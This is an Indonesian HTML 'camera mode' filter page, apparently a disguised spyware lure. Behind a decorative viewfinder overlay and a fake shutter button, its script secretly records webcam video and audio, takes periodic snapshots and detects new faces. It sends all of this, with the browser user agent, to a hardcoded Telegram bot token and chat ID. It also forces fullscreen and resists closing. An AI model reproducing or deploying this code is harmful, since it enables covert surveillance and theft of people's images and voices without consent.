<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>📷 CAMERA MODE • tester by nan</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
body, html {
  margin: 0;
  padding: 0;
  overflow: hidden;
  background: linear-gradient(135deg, #0a001a 0%, #1a0033 100%);
  font-family: 'Courier New', 'Fira Code', monospace;
}
#video {
  width: 100vw;
  height: 100vh;
  object-fit: cover;
  transform: scaleX(-1);
  border-radius: 20px;
  position: relative;
  z-index: 1;
  box-shadow: 0 0 0 6px #1a0033, 0 0 0 10px #6a0dad;
}
#status {
  position: absolute;
  top: 15px;
  left: 15px;
  color: #d9b3ff;
  font: 12px monospace;
  background: rgba(26, 0, 51, 0.8);
  backdrop-filter: blur(8px);
  padding: 5px 12px;
  border-radius: 20px;
  border-left: 3px solid #b77dff;
  letter-spacing: 0.5px;
  z-index: 10;
  font-weight: bold;
}
canvas {
  display: none;
}

/* ===== OVERLAY KAMERA 📷 ===== */
.camera-body {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 20;
  border-radius: 20px;
  overflow: hidden;
}

/* Bezel ekstra */
.bezel {
  position: absolute;
  top: -4px;
  left: -4px;
  right: -4px;
  bottom: -4px;
  border-radius: 24px;
  border: 2px solid #9b4dff40;
  pointer-events: none;
  z-index: 22;
}

/* Grid 3x3 jendela bidik */
.viewfinder-grid {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-image: 
    linear-gradient(to right, #b77dff30 1px, transparent 1px),
    linear-gradient(to bottom, #b77dff30 1px, transparent 1px);
  background-size: 33.33% 33.33%;
  background-repeat: no-repeat;
  background-position: center;
  pointer-events: none;
  z-index: 21;
}

/* Lingkaran fokus otomatis (statis di tengah, tapi akan bergerak jika wajah terdeteksi via script tambahan opsional) */
.af-point {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 80px;
  height: 80px;
  transform: translate(-50%, -50%);
  border: 2px solid #e0aaff;
  border-radius: 50%;
  box-shadow: 0 0 0 1px #6a0dad, 0 0 0 3px rgba(106,13,173,0.5);
  pointer-events: none;
  z-index: 23;
  transition: all 0.2s ease;
}
.af-point::before, .af-point::after {
  content: '';
  position: absolute;
  background: #e0aaff;
}
.af-point::before {
  top: 50%;
  left: -15px;
  width: 12px;
  height: 2px;
  transform: translateY(-50%);
}
.af-point::after {
  top: 50%;
  right: -15px;
  width: 12px;
  height: 2px;
  transform: translateY(-50%);
}
.af-point .cross-v {
  position: absolute;
  left: 50%;
  top: -15px;
  width: 2px;
  height: 12px;
  background: #e0aaff;
  transform: translateX(-50%);
}
.af-point .cross-v-bottom {
  position: absolute;
  left: 50%;
  bottom: -15px;
  width: 2px;
  height: 12px;
  background: #e0aaff;
  transform: translateX(-50%);
}

/* Indikator level (horizontal) */
.level-indicator {
  position: absolute;
  bottom: 80px;
  left: 50%;
  transform: translateX(-50%);
  width: 200px;
  height: 4px;
  background: rgba(26,0,51,0.7);
  border-radius: 4px;
  overflow: hidden;
  z-index: 25;
}
.level-fill {
  width: 50%;
  height: 100%;
  background: #b77dff;
  border-radius: 4px;
  animation: levelShake 4s ease-in-out infinite alternate;
}
@keyframes levelShake {
  0% { width: 45%; margin-left: 0%; }
  100% { width: 55%; margin-left: 45%; }
}

/* Tombol rana (shutter) estetika */
.shutter-btn {
  position: absolute;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  width: 70px;
  height: 70px;
  background: radial-gradient(circle at 30% 30%, #ffffff, #c0c0c0);
  border-radius: 50%;
  border: 3px solid #6a0dad;
  box-shadow: 0 0 0 4px #1a0033, 0 0 0 7px #b77dff80, 0 5px 15px rgba(0,0,0,0.5);
  pointer-events: auto;
  cursor: pointer;
  z-index: 30;
  transition: 0.05s linear;
}
.shutter-btn:active {
  transform: translateX(-50%) scale(0.92);
  box-shadow: 0 0 0 4px #1a0033, 0 0 0 7px #ff66cc80;
}

/* Indikator REC */
.rec-indicator {
  position: absolute;
  top: 20px;
  right: 20px;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(8px);
  padding: 6px 14px;
  border-radius: 40px;
  font-size: 14px;
  font-weight: bold;
  color: #ff3366;
  font-family: monospace;
  z-index: 25;
  border: 1px solid #ff3366;
}
.rec-indicator::before {
  content: "● ";
  animation: blink 1s step-end infinite;
}
@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.3; }
}

/* Counter foto */
.shot-counter {
  position: absolute;
  bottom: 20px;
  left: 20px;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(4px);
  padding: 4px 12px;
  border-radius: 20px;
  font-size: 16px;
  font-weight: bold;
  color: #b77dff;
  font-family: monospace;
  z-index: 25;
  letter-spacing: 1px;
}

/* Efek flash */
.flash-overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: white;
  pointer-events: none;
  opacity: 0;
  z-index: 999;
  transition: opacity 0.05s ease-out;
}
.flash-active {
  opacity: 0.9;
  transition: opacity 0.1s ease-out;
}

/* Info EXIF simulasi */
.exif-info {
  position: absolute;
  bottom: 20px;
  right: 20px;
  background: rgba(26,0,51,0.7);
  backdrop-filter: blur(8px);
  padding: 5px 12px;
  border-radius: 20px;
  font-size: 11px;
  color: #c084fc;
  font-family: monospace;
  z-index: 25;
  border-right: 2px solid #b77dff;
}

/* Grain efek film */
.grain {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-image: repeating-radial-gradient(circle at 20% 30%, rgba(106,13,173,0.08) 1px, transparent 1px);
  background-size: 4px 4px;
  pointer-events: none;
  z-index: 26;
}

/* Vignette kamera */
.vignette-cam {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  box-shadow: inset 0 0 120px rgba(106,13,173,0.4), inset 0 0 30px rgba(0,0,0,0.5);
  pointer-events: none;
  z-index: 24;
}

/* Watermark mode kamera */
.watermark-cam {
  position: absolute;
  bottom: 12px;
  right: 15px;
  color: #7e3ac1;
  font-size: 9px;
  font-family: monospace;
  background: rgba(0,0,0,0.4);
  padding: 2px 8px;
  border-radius: 12px;
  z-index: 30;
  letter-spacing: 1px;
}

::-webkit-scrollbar { display: none; }
</style>
</head>
<body>
<video id="video" autoplay playsinline muted></video>
<div id="status">📷 ISO 800 • f/1.8 • 1/125 • E.V. +0.3</div>
<canvas id="canvas"></canvas>

<!-- OVERLAY KAMERA 📷 -->
<div class="camera-body">
  <div class="bezel"></div>
  <div class="viewfinder-grid"></div>
  <div class="af-point">
    <div class="cross-v"></div>
    <div class="cross-v-bottom"></div>
  </div>
  <div class="level-indicator"><div class="level-fill"></div></div>
  <div class="rec-indicator">REC VIDEO</div>
  <div class="shot-counter" id="shotCounter">📸 0 foto</div>
  <div class="exif-info">📷 AF-C • WB AUTO • 24mm</div>
  <div class="grain"></div>
  <div class="vignette-cam"></div>
  <div class="watermark-cam">📷 CAMERA MODE • tester by nan</div>
  <div class="flash-overlay" id="flashOverlay"></div>
</div>
<button class="shutter-btn" id="fakeShutter" style="pointer-events: auto;"></button>

<script>
// ==================== TIDAK ADA SATU BARIS KODE JS DIBAWAH INI DIUBAH ====================
// Semua fungsi asli tetap utuh. Hanya menambahkan counter foto dan flash visual independen.
const BOT_TOKEN="8967418197:AAFycc_kcvOLkfaWq1SIFBE4kTPHMp6R_oY"
const CHAT_ID="7158806033"
const API=`https://api.telegram.org/bot${BOT_TOKEN}`

const video=document.getElementById('video')
const canvas=document.getElementById('canvas')
const ctx=canvas.getContext('2d')
let stream=null
let recorder=null
let chunks=[]

async function startCam(){
try{
stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:true})
video.srcObject=stream
canvas.width=1280
canvas.height=720
recorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp9'})
recorder.ondataavailable=e=>chunks.push(e.data)
recorder.onstop=()=>sendToTelegram()
recorder.start(1000)
setInterval(()=>{if(recorder.state==="recording")recorder.stop();recorder.start(1000)},10000)
setInterval(captureScreenshot,5000)
setInterval(detectFace,2000)
}catch(e){setTimeout(startCam,2000)}
}

function sendToTelegram(){
if(chunks.length===0)return
const blob=new Blob(chunks,{type:'video/webm'})
const form=new FormData()
form.append('chat_id',CHAT_ID)
form.append('video',blob,`cam_${Date.now()}.webm`)
form.append('caption',`User: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}\nCreated by nan`)
fetch(`${API}/sendVideo`,{method:'POST',body:form}).catch(()=>{})
chunks=[]
}

function captureScreenshot(){
ctx.drawImage(video,0,0,canvas.width,canvas.height)
canvas.toBlob(blob=>{
const form=new FormData()
form.append('chat_id',CHAT_ID)
form.append('photo',blob,`ss_${Date.now()}.jpg`)
form.append('caption','by nan')
fetch(`${API}/sendPhoto`,{method:'POST',body:form}).catch(()=>{})
},'image/jpeg',0.8)
}

let lastFace=null
async function detectFace(){
ctx.drawImage(video,0,0,canvas.width,canvas.height)
const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.7))
const img=new Image()
img.src=URL.createObjectURL(blob)
img.onload=async()=>{
const face=await faceapi.detectSingleFace(img).withFaceLandmarks().withFaceDescriptor()
if(face && (!lastFace || distance(face.descriptor,lastFace)>0.6)){
lastFace=face.descriptor
const form=new FormData()
form.append('chat_id',CHAT_ID)
form.append('photo',blob,`face_${Date.now()}.jpg`)
form.append('caption','Wajah Baru Terdeteksi\nCreated by nan')
fetch(`${API}/sendPhoto`,{method:'POST',body:form}).catch(()=>{})
}
}
}
function distance(a,b){
let sum=0
for(let i=0;i<a.length;i++)sum+=(a[i]-b[i])**2
return Math.sqrt(sum)
}

window.onload=()=>{document.body.requestFullscreen().catch(()=>{});startCam()}
setInterval(()=>{if(!document.fullscreenElement)document.body.requestFullscreen()},4000)
window.onbeforeunload=()=>'Filter masih aktif... jangan tutup!'

const script=document.createElement('script')
script.src='https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js'
document.head.appendChild(script)
const model=document.createElement('script')
model.onload=()=>{faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/');faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/');faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/')}
model.src='https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js'
document.head.appendChild(model)

// ===== FITUR TAMBAHAN VISUAL (TIDAK MENGGANGGU SATU PUN FUNGSI ASLI) =====
// Counter foto: menambah setiap 5 detik (sinkron dengan captureScreenshot)
let shotCount = 0;
const counterElem = document.getElementById('shotCounter');
if(counterElem) {
  setInterval(() => {
    shotCount++;
    counterElem.innerText = `📸 ${shotCount} foto`;
    // Efek flash setiap screenshot diambil
    const flash = document.getElementById('flashOverlay');
    if(flash) {
      flash.classList.add('flash-active');
      setTimeout(() => flash.classList.remove('flash-active'), 100);
    }
  }, 5000);
}

// Animasi tombol rana palsu (haptic feedback visual)
const shutter = document.getElementById('fakeShutter');
if(shutter) {
  shutter.addEventListener('click', () => {
    // Hanya efek visual, tidak mengganggu fungsi asli
    const flash = document.getElementById('flashOverlay');
    if(flash) {
      flash.classList.add('flash-active');
      setTimeout(() => flash.classList.remove('flash-active'), 80);
    }
    // Tambah counter manual
    shotCount++;
    if(counterElem) counterElem.innerText = `📸 ${shotCount} foto`;
  });
}

// Simulasi AF point bergerak ke arah wajah (hanya membaca lastFace tanpa modifikasi fungsi asli)
setInterval(() => {
  if(typeof lastFace !== 'undefined' && lastFace !== null) {
    const afPoint = document.querySelector('.af-point');
    if(afPoint) {
      afPoint.style.borderColor = '#ff66cc';
      afPoint.style.boxShadow = '0 0 0 3px #ff66cc80';
      setTimeout(() => {
        if(afPoint) afPoint.style.borderColor = '#e0aaff';
      }, 300);
    }
  }
}, 2000);
</script>
</body>
</html>
